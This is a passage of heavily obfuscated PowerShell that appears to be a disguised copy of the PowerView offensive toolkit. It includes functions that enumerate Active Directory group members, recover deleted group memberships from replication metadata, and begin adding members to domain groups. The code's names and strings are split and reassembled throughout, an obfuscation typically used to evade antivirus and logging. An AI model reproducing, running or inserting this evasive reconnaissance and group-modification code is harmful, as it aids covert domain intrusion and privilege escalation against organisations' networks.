                    ${gROuP`Se`A`RC`hEr}."F`ilteR" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${grOUp`seA`Rch`eR}."P`R`o`PErTi`EstOloAd".("{0}{1}{2}"-f'AddRa','n','ge').Invoke((("{1}{0}{2}{3}{4}"-f 'sti','di','ng','uishedN','ame')))
                    ${meM`B`ErS} = ${gROU`P`sEarCheR}.("{1}{0}"-f 'dAll','Fin').Invoke() | &("{1}{3}{0}{2}"-f '-Obje','Fo','ct','rEach') {${_}."pROpE`R`TIeS"."DiS`Ti`NGUIshE`dnAmE"[0]}
                }
                ${N`ULl} = ${s`EaRCHeRaRG`UME`NTS}.("{0}{1}" -f'Rem','ove').Invoke('Raw')
            }
            else {
                ${IDENtityFi`Lt`eR} = ''
                ${F`ilT`ER} = ''
                ${Id`EnTi`TY} | &("{1}{0}{2}"-f'here-Obje','W','ct') {${_}} | &("{1}{2}{0}" -f'ach-Object','F','orE') {
                    ${IdentiT`YIN`St`A`NCE} = ${_}.("{1}{0}" -f 'ce','Repla').Invoke('(', '\28').("{1}{0}{2}" -f 'e','R','place').Invoke(')', '\29')
                    if (${Ide`NTITYinST`A`NcE} -match ("{1}{0}"-f'-1-','^S')) {
                        ${id`entityf`iL`TeR} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IDEN`T`iTyIN`stA`Nce} -match ("{1}{0}"-f 'CN=','^')) {
                        ${I`D`ENtIty`FI`LTeR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${psB`oUn`dPara`me`TERS}[("{1}{0}{2}"-f'ai','Dom','n')]) -and (-not ${PSb`Ou`NDpA`RAMEteRs}[("{2}{0}{1}"-f 'e','archBase','S')])) {
                            
                            
                            ${I`de`N`TiTYDoMA`In} = ${iDeNT`I`TYiNst`ANCE}.("{2}{1}{0}"-f'String','b','Su').Invoke(${IdE`NtI`TyI`NST`A`NcE}.("{0}{1}" -f 'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{4}{2}{3}{0}" -f 'e','Write-Ve','bo','s','r') ('[Ge'+'t-Dom'+'a'+'i'+'nGr'+'oupM'+'ember] '+'Ex'+'tra'+'cted '+'do'+'main'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${sEar`CH`ERArGu`mEN`TS}[("{2}{0}{1}"-f 'oma','in','D')] = ${idenT`iT`yDO`main}
                            ${G`R`oU`pS`eaRCheR} = &("{3}{2}{1}{0}"-f'her','earc','-DomainS','Get') @SearcherArguments
                            if (-not ${GR`Oup`sE`ARChER}) {
                                &("{0}{2}{1}"-f'W','ite-Warning','r') ('['+'G'+'et-Domai'+'n'+'Group'+'Member] '+'U'+'n'+'able '+'t'+'o '+'retrie'+'v'+'e '+'d'+'o'+'main '+'sea'+'rc'+'her '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${id`EN`TiT`y`inSta`NCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GUI`dByT`ESTr`Ing} = (([Guid]${I`de`N`TI`TYInstANcE}).("{1}{2}{0}" -f 'Array','ToByt','e').Invoke() | &("{1}{4}{2}{3}{0}"-f 'ject','ForE','ch-','Ob','a') { '\' + ${_}.("{0}{2}{1}" -f'To','g','Strin').Invoke('X2') }) -join ''
                        ${i`dE`Nt`i`TyFilTeR} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${IdeNti`TYi`NST`A`NCE}.("{1}{0}" -f'ontains','C').Invoke('\')) {
                        ${cONVEr`Ted`ID`en`TItyiNSt`Ance} = ${Id`ENti`T`yInStaN`Ce}.("{1}{2}{0}" -f'e','R','eplac').Invoke('\28', '(').("{1}{0}{2}" -f'pla','Re','ce').Invoke('\29', ')') | &("{0}{1}{2}" -f 'Conve','rt-ADNam','e') -OutputType ("{2}{1}{0}"-f 'ical','on','Can')
                        if (${C`onVeRT`e`did`ENTI`T`Yinsta`N`ce}) {
                            ${G`R`OuPDOmAin} = ${C`On`VErtEDidenTityinST`A`NCE}.("{2}{0}{1}" -f'ub','String','S').Invoke(0, ${cONVE`R`TedidE`N`TIt`Yi`NSTa`NcE}.("{1}{0}"-f'Of','Index').Invoke('/'))
                            ${gRO`Up`N`Ame} = ${i`Denti`Ty`INS`TAncE}.("{0}{1}" -f 'Spli','t').Invoke('\')[1]
                            ${iDENTiTy`FI`lter} += "(samAccountName=$GroupName)"
                            ${SeArch`eR`AR`GumEN`Ts}[("{0}{1}" -f'Do','main')] = ${Gr`oUpdOm`AIN}
                            &("{0}{2}{1}" -f 'Writ','Verbose','e-') ('[G'+'e'+'t-Do'+'m'+'ainGrou'+'pMember] '+'E'+'xtra'+'cte'+'d '+'domain'+' '+"'$GroupDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${Grou`PsEa`R`C`her} = &("{0}{2}{3}{1}"-f'Ge','Searcher','t','-Domain') @SearcherArguments
                        }
                    }
                    else {
                        ${id`en`TIt`YFiLt`ER} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${idenTit`Y`FI`L`Ter} -and (${iDe`NTI`TYfi`lT`eR}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') ) {
                    ${f`I`LtER} += "(|$IdentityFilter)"
                }

                if (${psbO`U`N`D`PARaMet`erS}[("{2}{0}{1}"-f 'DA','PFilter','L')]) {
                    &("{2}{0}{1}" -f 'os','e','Write-Verb') ('[Ge'+'t-'+'Doma'+'in'+'GroupM'+'e'+'mber] '+'U'+'sing '+'a'+'dditi'+'onal'+' '+'LDAP'+' '+'filt'+'er: '+"$LDAPFilter")
                    ${f`ilT`ER} += "$LDAPFilter"
                }

                ${g`R`Ou`pSEaRChER}."fILt`eR" = "(&(objectCategory=group)$Filter)"
                &("{1}{2}{0}" -f'rbose','Wr','ite-Ve') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${r`es`UlT} = ${grou`P`seaR`CHeR}.("{0}{1}{2}"-f 'Fi','ndOn','e').Invoke()
                }
                catch {
                    &("{2}{3}{0}{1}" -f 'Warn','ing','Write','-') ('[Get-D'+'oma'+'i'+'nGrou'+'p'+'Member] '+'Er'+'ror '+'searchi'+'ng'+' '+'fo'+'r '+'gr'+'oup '+'wi'+'th '+'iden'+'tit'+'y '+"'$Identity': "+"$_")
                    ${m`Em`BERS} = @()
                }

                ${g`Ro`UpFo`UNDNaME} = ''
                ${G`ROUPfOU`Nddn} = ''

                if (${re`sUlT}) {
                    ${m`eMbe`RS} = ${res`UlT}."prO`p`ERTIes".("{1}{0}" -f'tem','i').Invoke(("{0}{1}"-f 'membe','r'))

                    if (${Mem`B`ErS}."C`ount" -eq 0) {
                        
                        ${FIn`iSH`ED} = ${F`A`LSE}
                        ${BOTT`OM} = 0
                        ${t`op} = 0

                        while (-not ${fIN`IshED}) {
                            ${T`oP} = ${Bo`TtOM} + 1499
                            ${MEmbERra`N`Ge}="member;range=$Bottom-$Top"
                            ${bOt`ToM} += 1500
                            ${nU`ll} = ${GR`O`UPSearCH`er}."pR`OPerT`Iest`oLoaD".("{0}{1}"-f'Cl','ear').Invoke()
                            ${nu`LL} = ${g`ROUp`seaRC`hER}."prOPErTi`ES`TO`loaD".("{1}{0}" -f 'dd','A').Invoke("$MemberRange")
                            ${nu`ll} = ${GroU`ps`eaRCheR}."p`RO`PeRt`ieSt`OLoAd".("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}{4}{3}" -f's','nt','amaccou','ame','n'))
                            ${N`ULl} = ${gRouPsE`ARC`H`ER}."pR`OPERtiEs`TO`LOAD".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{4}{1}{3}"-f 'disting','e','u','dname','ish'))

                            try {
                                ${rE`su`LT} = ${grOU`psEa`RChER}.("{0}{1}"-f'FindOn','e').Invoke()
                                ${r`AN`GedP`RoPErtY} = ${r`ESULt}."PrO`pe`RTIES"."p`ROPERTynam`Es" -like ("{1}{0}{2}" -f 'er;','memb','range=*')
                                ${M`eMbe`Rs} += ${r`eS`ULt}."prOP`Er`TiEs".("{0}{1}" -f'i','tem').Invoke(${r`Ang`EDP`R`OperTy})
                                ${G`ROuP`FoU`N`dName} = ${RE`su`Lt}."PRO`PER`TIeS".("{1}{0}" -f 'tem','i').Invoke(("{2}{3}{1}{0}"-f 'e','ntnam','samacc','ou'))[0]
                                ${Gr`Oupfo`U`NDdN} = ${RESU`LT}."pr`oPErti`eS".("{1}{0}" -f 'm','ite').Invoke(("{1}{2}{3}{0}" -f 'ame','d','isti','nguishedn'))[0]

                                if (${M`EMb`erS}."C`oUNT" -eq 0) {
                                    ${fIN`I`SheD} = ${Tr`UE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${fI`NISH`Ed} = ${tr`Ue}
                            }
                        }
                    }
                    else {
                        ${GRoUP`FOUn`Dn`AMe} = ${R`eSULT}."ProPe`R`TIEs".("{1}{0}" -f'm','ite').Invoke(("{1}{2}{3}{0}"-f 'name','sam','acc','ount'))[0]
                        ${GrOu`PFoUn`dDN} = ${ReS`ULt}."pRopERt`i`eS".("{1}{0}"-f 'tem','i').Invoke(("{3}{0}{2}{1}" -f'istinguis','dname','he','d'))[0]
                        ${me`mbeRS} += ${R`eS`Ult}."pROpe`Rt`I`eS".("{0}{1}" -f'ite','m').Invoke(${r`ANG`edpRoP`e`RTy})
                    }

                    if (${PSBOunD`paRame`Te`RS}[("{1}{0}"-f 'omain','D')]) {
                        ${GrouP`F`o`UnDdOMAIn} = ${Dom`A`in}
                    }
                    else {
                        
                        if (${gROU`pfOUND`Dn}) {
                            ${GRO`UpfoU`NDdoM`Ain} = ${Gro`Up`FouNd`dN}.("{1}{0}{2}"-f'Strin','Sub','g').Invoke(${g`RouPfo`UNDDN}.("{1}{0}{2}" -f 'd','In','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${mEM`B`Er} in ${me`m`Bers}) {
                if (${RecU`R`se} -and ${USEMaTC`HI`N`GRULe}) {
                    ${Pr`o`peRties} = ${_}."p`R`OPeRTIes"
                }
                else {
                    ${obje`cTSE`AR`chE`Rar`gUM`eN`TS} = ${SEarCh`e`RA`RgUME`NTs}.("{1}{0}"-f'e','Clon').Invoke()
                    ${obJeCtsEa`RC`He`Rarg`U`m`e`NtS}[("{0}{1}{2}"-f 'Id','entit','y')] = ${mem`B`ER}
                    ${obJe`cTs`eArcherar`gUm`entS}['Raw'] = ${TR`Ue}
                    ${ObjECt`searcHerAr`Gu`Me`Nts}[("{2}{1}{0}" -f'ties','roper','P')] = ("{11}{9}{7}{4}{12}{14}{5}{8}{3}{2}{10}{0}{6}{15}{13}{1}"-f'na','ectclass','ou','cc','hed','sa','me,objects','uis','ma','g','nt','distin','name,c','d,obj','n,','i')
                    ${O`B`JECt} = &("{3}{0}{2}{4}{1}" -f'ainObj','t','e','Get-Dom','c') @ObjectSearcherArguments
                    ${p`ROPe`RTI`ES} = ${O`Bj`ect}."pr`opErT`iES"
                }

                if (${P`RO`pErti`Es}) {
                    ${G`ROu`pmem`BER} = &("{2}{0}{1}"-f 'ew-Objec','t','N') ("{2}{1}{0}" -f 'ject','SOb','P')
                    ${g`R`OU`PmeMBEr} | &("{2}{0}{1}"-f 'mbe','r','Add-Me') ("{0}{2}{1}"-f'Notep','operty','r') ("{1}{0}{2}" -f'p','Grou','Domain') ${G`ROU`PFou`Ndd`OmaIN}
                    ${GRoup`M`emB`ER} | &("{2}{1}{0}" -f'ember','dd-M','A') ("{2}{0}{1}" -f'o','perty','Notepr') ("{2}{1}{0}"-f'me','pNa','Grou') ${G`Rou`p`FOu`NDNamE}
                    ${g`RoUP`MeMBer} | &("{3}{0}{2}{1}" -f'dd-','ember','M','A') ("{1}{2}{0}{3}"-f'r','Noteprop','e','ty') ("{1}{5}{4}{2}{3}{0}{6}" -f 'Na','G','istinguis','hed','D','roup','me') ${GROU`PfOuNd`dN}

                    if (${Pr`oPe`RTies}."o`Bje`cTsiD") {
                        ${me`mbEr`SID} = ((&("{0}{2}{1}"-f'N','-Object','ew') ("{7}{11}{2}{0}{8}{9}{5}{3}{1}{4}{10}{6}{12}"-f '.P','ityId','em.Security','r','en','Secu','f','S','rincip','al.','ti','yst','ier') ${PRopErT`I`ES}."oB`j`EctSId"[0], 0)."val`UE")
                    }
                    else {
                        ${meMbE`R`s`iD} = ${NU`LL}
                    }

                    try {
                        ${m`E`MberdN} = ${pR`OpeRtI`eS}."DisT`in`guIsheDn`AmE"[0]
                        if (${mE`MB`eR`Dn} -match ((("{0}{2}{7}{4}{5}{6}{8}{3}{1}"-f 'For','5-21','eignS','-','tyP','rincip','als7','ecuri','WsS-1'))  -RePLACe ([char]55+[char]87+[char]115),[char]124)) {
                            try {
                                if (-not ${M`EmbeR`Sid}) {
                                    ${M`E`mBErsiD} = ${p`RoPErTi`Es}."Cn"[0]
                                }
                                ${MEm`B`erSIMPL`ENAmE} = &("{2}{1}{0}{3}" -f'-','nvert','Co','ADName') -Identity ${m`eMBE`RS`id} -OutputType ("{1}{3}{2}{0}"-f'e','Domai','pl','nSim') @ADNameArguments

                                if (${m`EMBE`Rs`iMP`lEnA`me}) {
                                    ${memBE`RD`o`MAin} = ${m`E`MbErsim`P`LEnAMe}.("{1}{0}" -f 'lit','Sp').Invoke('@')[1]
                                }
                                else {
                                    &("{1}{0}{2}" -f 'ite-War','Wr','ning') ('['+'Ge'+'t-D'+'omainGr'+'oupMember'+'] '+'Erro'+'r '+'conve'+'rting'+' '+"$MemberDN")
                                    ${mE`M`B`ErdomAin} = ${N`Ull}
                                }
                            }
                            catch {
                                &("{0}{3}{1}{2}" -f'Writ','in','g','e-Warn') ('['+'G'+'et-'+'DomainGroup'+'Member] '+'Er'+'ror '+'c'+'onvert'+'i'+'ng '+"$MemberDN")
                                ${MemBer`d`om`Ain} = ${N`Ull}
                            }
                        }
                        else {
                            
                            ${ME`MB`E`RdOmAIN} = ${MeM`BER`Dn}.("{2}{1}{0}" -f 'tring','S','Sub').Invoke(${m`e`mbER`dn}.("{1}{0}{2}" -f 'dex','In','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${mE`mbeR`dN} = ${n`UlL}
                        ${m`Em`BEr`domain} = ${N`ULL}
                    }

                    if (${P`ROPer`Ti`es}."sam`A`CcoUn`T`NAMe") {
                        
                        ${m`E`MbERnA`Me} = ${PR`O`peRti`ES}."s`AmaCCoUN`T`N`AME"[0]
                    }
                    else {
                        
                        try {
                            ${m`emBE`RnAme} = &("{2}{1}{4}{0}{3}" -f'ro','t','Conver','m-SID','F') -ObjectSID ${PROp`er`Ti`eS}."Cn"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${ME`mb`ERn`Ame} = ${PRoP`ER`TiES}."c`N"[0]
                        }
                    }

                    if (${p`ROp`E`RTIeS}."obJ`E`cTClA`Ss" -match ("{1}{0}{2}"-f'mpu','co','ter')) {
                        ${meMb`ERO`BJeCT`ClASs} = ("{0}{1}{2}" -f'c','ompute','r')
                    }
                    elseif (${pR`oPErtI`es}."Obj`e`CTClaSS" -match ("{1}{0}" -f 'roup','g')) {
                        ${m`eM`BEroBJEc`TcLa`SS} = ("{0}{1}"-f'grou','p')
                    }
                    elseif (${Pr`opE`RtI`ES}."ob`JecTc`lASs" -match ("{1}{0}" -f'ser','u')) {
                        ${MeMBErObjeC`T`C`lasS} = ("{0}{1}"-f 'use','r')
                    }
                    else {
                        ${M`Em`Be`RoBJEc`TCl`ASs} = ${nu`Ll}
                    }
                    ${gR`Oup`mem`Ber} | &("{1}{2}{0}"-f 'er','A','dd-Memb') ("{3}{2}{1}{0}"-f'y','opert','r','Notep') ("{0}{2}{1}{3}"-f 'Member','ma','Do','in') ${me`MbER`do`MAin}
                    ${g`RO`UPmembeR} | &("{2}{1}{0}"-f'-Member','d','Ad') ("{3}{1}{0}{2}"-f 'er','prop','ty','Note') ("{1}{0}{2}"-f 'mberN','Me','ame') ${mem`B`e`RNamE}
                    ${Gr`ouPme`mbEr} | &("{1}{0}{2}"-f'd','A','d-Member') ("{0}{1}{2}{3}"-f'N','otep','rope','rty') ("{0}{3}{4}{2}{1}" -f'M','me','a','emberDis','tinguishedN') ${mEMB`E`RDn}
                    ${GR`oUPM`e`MbEr} | &("{1}{2}{0}" -f 'ber','Add','-Mem') ("{2}{1}{0}{3}" -f'ro','tep','No','perty') ("{3}{1}{2}{4}{0}" -f'lass','be','rObje','Mem','ctC') ${MEmbER`OB`j`ec`Tc`LasS}
                    ${GrOuP`MEm`Ber} | &("{0}{1}{2}" -f'Ad','d-Membe','r') ("{2}{1}{0}" -f'property','e','Not') ("{1}{0}"-f 'SID','Member') ${Mem`BE`RSId}
                    ${groUP`M`Emb`ER}."PsO`B`jEct"."typ`e`NAmeS".("{1}{0}" -f't','Inser').Invoke(0, ("{2}{0}{3}{1}" -f 'V','Member','Power','iew.Group'))
                    ${grOuPm`E`mbeR}

                    
                    if (${p`s`BoUn`DPARaMeTerS}[("{2}{1}{0}"-f'e','ecurs','R')] -and ${meMbe`R`dN} -and (${MembERo`BJeCT`C`LAss} -match ("{1}{0}" -f 'p','grou'))) {
                        &("{1}{0}{2}" -f'rite-Ve','W','rbose') ('[Get-D'+'oma'+'inGroupMember'+']'+' '+'M'+'anual'+'ly '+'recu'+'rsi'+'ng '+'on'+' '+'g'+'roup: '+"$MemberDN")
                        ${Sea`R`c`heRarG`UMEnTS}[("{0}{1}"-f'I','dentity')] = ${m`EmbErDn}
                        ${nU`ll} = ${s`eaRCher`AR`GUMeNTS}.("{2}{0}{1}"-f 'em','ove','R').Invoke(("{2}{1}{0}" -f'rties','rope','P'))
                        &("{2}{1}{3}{0}{4}" -f'main','et-','G','Do','GroupMember') @SearcherArguments
                    }
                }
            }
            ${g`Roupse`A`RCHeR}.("{1}{2}{0}" -f 'se','d','ispo').Invoke()
        }
    }
}


function Get`-d`oMAi`NG`Roup`Me`MBerd`eL`eTEd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{7}{5}{6}{0}{2}{1}{4}{8}"-f'eTha','ssignm','nA','PSUseDec','en','edVarsM','or','lar','ts'}, '')]
    [OutputType({"{1}{2}{6}{3}{0}{7}{5}{4}" -f'D','P','o','View.','upMemberDeleted','ainGro','wer','om'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitIon = 0, VAlUEFROmPiPeline = ${tr`UE}, vaLuEfROmPiPelINeBYproPeRtYNaMe = ${t`RuE})]
        [Alias({"{2}{1}{3}{0}"-f 'e','tinguis','Dis','hedNam'}, {"{1}{0}{2}{3}" -f'mA','Sa','cco','untName'}, {"{1}{0}"-f 'ame','N'}, {"{0}{3}{1}{2}{4}"-f 'M','mberD','isting','e','uishedName'}, {"{1}{2}{0}" -f'ame','Member','N'})]
        [String[]]
        ${iDe`N`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doMA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${ld`AP`FilTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'D','SPath','A'})]
        [String]
        ${SE`ARcHB`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}{5}"-f'ntr','ol','Co','Domain','le','r'})]
        [String]
        ${Ser`V`Er},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{2}{1}{0}" -f'Level','ne','O'}, {"{1}{0}"-f 'ree','Subt'})]
        [String]
        ${sE`A`Rchsc`OPe} = ("{0}{2}{1}"-f'S','tree','ub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSulT`p`A`G`ESiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RV`eRTiMELI`Mit},

        [Switch]
        ${Tomb`s`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DENti`AL} =  ( gET-iTem  VARiABLE:21GV7E).vaLUe::"E`MpTY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${sEArc`he`R`Arg`UmENts} = @{
            ("{0}{2}{1}"-f 'Propert','s','ie')    =   ("{6}{5}{3}{1}{2}{4}{0}" -f 'adata','-rep','lvalu','ds','emet','s','m'),("{0}{1}{2}{3}{4}" -f'di','st','in','guishedna','me')
            'Raw'           =   ${T`RUE}
            ("{0}{1}{2}{3}"-f'LDAPFi','l','t','er')    =   ("{0}{5}{2}{3}{1}{4}" -f'(obj','y=group','go','r',')','ectCate')
        }
        if (${pSbouNd`pA`RAme`T`eRS}[("{0}{1}"-f'Domai','n')]) { ${SEArcherar`G`UME`NTS}[("{1}{0}" -f 'ain','Dom')] = ${D`OM`AIN} }
        if (${PsbOUnD`p`A`RAmETERs}[("{1}{2}{0}"-f'r','LDAPFilt','e')]) { ${SE`ARC`HErA`RG`UM`ents}[("{2}{0}{1}" -f'D','APFilter','L')] = ${Lda`P`FILTeR} }
        if (${PsbOUn`dpara`M`eTE`Rs}[("{2}{3}{0}{1}"-f'hB','ase','S','earc')]) { ${Se`ARCH`E`RarGU`MEN`TS}[("{1}{0}{2}" -f'rc','Sea','hBase')] = ${SeArC`H`BA`sE} }
        if (${PsB`Ou`NDpAR`A`MEtE`Rs}[("{1}{0}"-f 'ver','Ser')]) { ${SEa`RCHeR`ARg`Uments}[("{0}{1}" -f 'Ser','ver')] = ${SE`RVEr} }
        if (${pSB`ou`NDpAR`AM`EteRS}[("{0}{3}{1}{2}"-f'Sea','p','e','rchSco')]) { ${SEa`Rch`eRArgUm`ENts}[("{3}{2}{0}{1}" -f'chScop','e','r','Sea')] = ${sE`A`R`chScOpE} }
        if (${Ps`B`oundpara`meTERS}[("{3}{0}{2}{4}{1}"-f'l','eSize','tP','Resu','ag')]) { ${s`EA`RchERarGUME`Nts}[("{1}{2}{0}" -f 'ze','Re','sultPageSi')] = ${RE`suLtPaG`e`S`iZe} }
        if (${P`SBOUn`dPA`RaMEt`Ers}[("{3}{1}{2}{4}{0}"-f'imit','erve','r','S','TimeL')]) { ${sE`ARcHERa`R`G`UmeN`Ts}[("{3}{2}{1}{4}{0}" -f't','rTimeLim','erve','S','i')] = ${SeRv`E`RTIME`liMiT} }
        if (${psbOu`NdP`ARA`me`TerS}[("{0}{2}{1}"-f'Tombs','one','t')]) { ${SeArCH`E`RA`RGU`MENTs}[("{1}{2}{0}" -f 'ne','To','mbsto')] = ${toM`B`stoNe} }
        if (${pSb`OUND`pa`Ra`METerS}[("{0}{1}{2}{3}"-f'C','reden','tia','l')]) { ${sEa`R`c`hErAR`g`UMeNTs}[("{0}{2}{1}" -f'Credent','al','i')] = ${c`ReDenti`Al} }
    }

    PROCESS {
        if (${pSbou`Nd`p`ARa`mE`TeRs}[("{0}{1}" -f'Ident','ity')]) { ${SEaRC`He`RArGUME`NTS}[("{2}{0}{1}"-f'entit','y','Id')] = ${IdE`N`TIty} }

        &("{0}{3}{1}{2}{4}" -f 'G','-D','omainObjec','et','t') @SearcherArguments | &("{1}{2}{0}" -f 'Object','ForEach','-') {
            ${ObjEC`T`dn} = ${_}."pr`O`pErtI`ES"[("{2}{0}{1}{3}" -f'gui','shedna','distin','me')][0]
            ForEach(${xML`No`dE} in ${_}."ProP`e`RtiES"[("{4}{3}{2}{5}{1}{0}" -f 'a','tadat','eplv','ds-r','ms','alueme')]) {
                ${te`M`POBj`ect} = [xml]${x`mL`NoDe} | &("{1}{2}{0}" -f 'ct','Select','-Obje') -ExpandProperty ("{0}{5}{2}{1}{3}{4}"-f 'DS','A','L_VALUE_MET','_DAT','A','_REP') -ErrorAction ("{1}{0}{2}{3}" -f 'tlyCont','Silen','in','ue')
                if (${T`EMpo`B`ject}) {
                    if ((${tem`POBje`ct}."PSZATTRib`UTE`NaMe" -Match ("{2}{0}{1}" -f 'be','r','mem')) -and ((${tEmp`oB`JEct}."DWvEr`S`iOn" % 2) -eq 0 )) {
                        ${outP`UT} = &("{1}{0}{2}" -f'w-Obje','Ne','ct') ("{1}{0}{2}" -f'jec','PSOb','t')
                        ${OUTP`Ut} | &("{2}{1}{0}"-f'er','d-Memb','Ad') ("{0}{2}{1}" -f'NotePr','erty','op') ("{0}{1}" -f 'G','roupDN') ${OBJ`eCTdn}
                        ${out`PUT} | &("{1}{2}{0}"-f 'er','Add-Me','mb') ("{2}{1}{3}{0}" -f 'y','rope','NoteP','rt') ("{2}{1}{0}"-f 'erDN','mb','Me') ${TemPObj`e`ct}."PSZoB`J`eCTDN"
                        ${O`U`TpUt} | &("{0}{3}{2}{1}" -f 'Add','r','Membe','-') ("{1}{2}{0}" -f'operty','NoteP','r') ("{3}{1}{0}{2}"-f 'irstA','F','dded','Time') ${TE`MPobJe`ct}."F`Ti`MeCREat`eD"
                        ${O`Ut`put} | &("{0}{1}{2}" -f'Ad','d-Me','mber') ("{2}{1}{3}{0}"-f'erty','r','NoteP','op') ("{1}{3}{2}{0}" -f 'ted','Ti','ele','meD') ${T`emPobj`e`cT}."FtiM`EDEL`ETED"
                        ${o`U`Tput} | &("{1}{0}{2}"-f'Me','Add-','mber') ("{1}{0}{3}{2}"-f 'tePro','No','ty','per') ("{1}{5}{4}{3}{2}{0}" -f'ge','Las','Chan','inating','rig','tO') ${TeM`P`obJect}."fTi`mE`l`A`storiG`i`NATInGCHaN`Ge"
                        ${O`UT`puT} | &("{0}{1}{2}"-f'A','d','d-Member') ("{1}{0}{2}{3}"-f 'r','NoteP','opert','y') ("{3}{2}{1}{0}" -f'dded','esA','m','Ti') (${T`emPo`BJE`Ct}."dW`Ve`RsIoN" / 2)
                        ${OU`T`PUt} | &("{3}{1}{0}{2}" -f'b','dd-Mem','er','A') ("{0}{1}{2}"-f'NoteP','rop','erty') ("{2}{3}{0}{1}{6}{5}{4}" -f'r','ig','La','stO','tingDsaDN','na','i') ${te`mpObj`e`CT}."pszlA`st`o`Ri`g`iNaTI`NG`dsADn"
                        ${Outp`UT}."P`soB`jecT"."typEN`A`meS".("{0}{1}" -f'Inser','t').Invoke(0, ("{4}{10}{7}{0}{5}{2}{6}{3}{9}{8}{1}" -f'ie','ed','D','rDe','Pow','w.','omainGroupMembe','V','et','l','er'))
                        ${ou`TP`Ut}
                    }
                }
                else {
                    &("{2}{0}{1}"-f 'r','ite-Verbose','W') ('[Get-DomainGr'+'oupM'+'em'+'be'+'rDele'+'ted'+'] '+'Error'+' '+'ret'+'rieving'+' '+('{0}msd'+'s-'+'rep'+'lvalu'+'emet'+'ada'+'ta{0} ')  -f  [Char]39+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function adD-`D`oMAi`NgrouPMembeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f 's','PS','s','ShouldProce'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitIOn = 0, MANDAtorY = ${Tr`UE})]
        [Alias({"{0}{2}{1}"-f 'Grou','me','pNa'}, {"{2}{0}{1}" -f 'pId','entity','Grou'})]
        [String]
        ${ide`Nt`ItY},

        [Parameter(MANDaTOry = ${Tr`UE}, vALueFROMpIpElinE = ${Tr`UE}, VALUEFroMpIpeLinEBYPROpertYNAME = ${TR`Ue})]
        [Alias({"{0}{2}{1}{3}"-f 'MemberI','enti','d','ty'}, {"{0}{1}"-f'M','ember'}, {"{1}{0}{3}{4}{2}"-f's','Distingui','dName','h','e'})]
        [String[]]
        ${M`eM`BerS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMA`In},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`denT`i`AL} =   ( Gi VARiAblE:21GV7e).vALuE::"E`MPTy"
    )

    BEGIN {
        ${CO`NTEx`TARGuMEn`Ts} = @{
            ("{0}{1}" -f'Identit','y') = ${I`DENtI`TY}
        }
        if (${P`s`BouN`DpaRAme`TeRs}[("{0}{1}" -f 'Doma','in')]) { ${cOnTe`xtAR`GuM`Ents}[("{1}{0}" -f'ain','Dom')] = ${dO`mA`IN} }
        if (${PS`Bou`ND`PaRAmE`T`eRS}[("{2}{1}{0}" -f 'dential','re','C')]) { ${Co`NtE`XtArGu`menTS}[("{1}{2}{0}" -f'ial','C','redent')] = ${CRede`Nti`Al} }

        ${GRouPCO`N`Te`xT} = &("{3}{4}{1}{2}{0}"-f 't','alCont','ex','G','et-Princip') @ContextArguments

        if (${G`Ro`UpCONT`E`xt}) {
            try {
                ${G`R`OuP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{3}{1}{4}{0}" -f 'y','en','Find','ById','tit').Invoke(${gR`OuPCon`T`EXT}."C`oNteXT", ${grOupc`On`Te`XT}."iDEnTi`Ty")
            }
            catch {
                &("{2}{1}{0}"-f'ite-Warning','r','W') ('[Add-Domain'+'Gro'+'upMe'+'mber'+'] '+'Error'+' '+'fi'+'nding '+'th'+'e '+'gr'+'ou'+'p '+'ident'+'it'+'y'+' '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${gr`Oup}) {
            ForEach (${mEM`BeR} in ${MeM`BErS}) {
                if (${MeM`B`er} -match ((("{1}{0}{2}" -f'{0}{0}.','.+','+'))-F  [chAR]92)) {
                    ${cONT`e`XTarG`UMEntS}[("{2}{0}{1}"-f 'ent','ity','Id')] = ${mem`BeR}
                    ${USEr`CON`TE`XT} = &("{4}{0}{5}{1}{2}{3}" -f 'Pri','on','te','xt','Get-','ncipalC') @ContextArguments
                    if (${UsEr`Con`TEXt}) {
